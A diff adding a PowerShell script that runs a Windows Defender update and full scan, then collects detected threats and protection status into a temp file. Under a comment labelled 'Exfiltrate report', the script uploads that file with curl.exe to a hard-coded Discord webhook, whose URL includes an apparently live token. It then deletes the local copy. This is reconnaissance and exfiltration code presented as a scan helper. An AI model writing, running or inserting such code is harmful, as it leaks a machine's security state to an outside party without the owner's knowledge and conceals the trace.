@@ -1,0 +1,37 @@
+$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
+$reportPath = "$env:TEMP\DefenderScan-$(Get-Date -f yyyyMMddHHmm).txt"
+
+try {
+    # Update definitions
+    Update-MpSignature
+    
+    # Run full scan
+    $scan = Start-MpScan -ScanType FullScan -AsJob
+    while ($scan.State -eq 'Running') {
+        Start-Sleep -Seconds 10
+        "Scan progress: $($scan.Progress)" | Out-File $reportPath -Append
+    }
+
+    # Get results
+    $threats = Get-MpThreat
+    if ($threats) {
+        "=== Detected Threats ===" | Out-File $reportPath
+        $threats | Format-Table -Property ThreatID,Resource,Severity | Out-File $reportPath -Append
+    } else {
+        "No threats detected" | Out-File $reportPath
+    }
+
+    # Add protection status
+    "`n=== Protection Status ===" | Out-File $reportPath -Append
+    Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusSignatureAge | Out-File $reportPath -Append
+
+    # Exfiltrate report
+    curl.exe -F "file1=@$reportPath" $hook
+}
+catch {
+    "Scan failed: $_" | Out-File $reportPath
+    curl.exe -F "file1=@$reportPath" $hook
+}
+finally {
+    Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
+}
